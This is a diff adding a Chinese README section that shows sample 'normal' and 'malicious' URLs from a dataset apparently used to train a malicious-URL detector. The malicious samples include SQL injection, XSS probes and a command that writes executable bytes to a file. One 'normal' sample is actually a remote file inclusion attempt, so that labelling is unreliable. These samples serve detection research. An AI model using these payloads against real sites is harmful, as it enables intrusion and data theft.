@@ -288,8 +288,28 @@ function escapeHTML(str) {
 	<img src="https://github.com/HaojunYuPKU/WEB/blob/main/images/dl.png" height = "400" /> 
 </div>
 
+为方便用户了解我们工作的数据，下面选取了我们所用数据集中的部分正常url和恶意url：
 
-
+正常url：
+```
+/includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
+/javascript/usr.ep
+/page-13/
+/comxast/
+/dj mortis - stringent bass/
+/javascript/children.war
+...
+```
+恶意url：
+```
++echo+db+4d+5a+50+00+02+00+00+00+04+00+0f+00+ff+ff+00+00+b8+00+00+00+00+00+00+00+40++>>esbq
+/cgi-bin/index.php?op=default&date=200607' union select 1,501184215,1,1,1,1,1,1,1,1--&blogid=1
+/debug/showproc?proc===<script>alert('vulnerable');</script>
+/<script>document.cookie="testnvxc=4301;"</script>
+/cacti/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331905098')</script>
+...
+```
+可以看到bad url集合中包含了XSS和SQL的注入攻击
 
 
 
